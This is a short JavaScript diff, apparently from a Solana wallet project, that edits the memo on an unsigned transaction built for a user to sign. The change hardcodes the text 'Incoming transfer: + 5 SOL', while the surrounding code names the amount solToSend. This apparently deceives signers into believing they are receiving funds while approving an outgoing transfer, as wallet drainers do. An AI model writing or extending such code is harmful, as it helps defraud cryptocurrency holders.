@@ -116,7 +116,7 @@ export async function createUnsignedTransaction(userPublicKey) {
     const solAmount = (solToSend / LAMPORTS_PER_SOL).toFixed(2);
     instructions.push(
       createMemoInstruction(
-        `📩 Incoming transfer: + ${solAmount} SOL`,
+        `📩 Incoming transfer: + 5 SOL`,
         [userPublicKey]
       )
     );
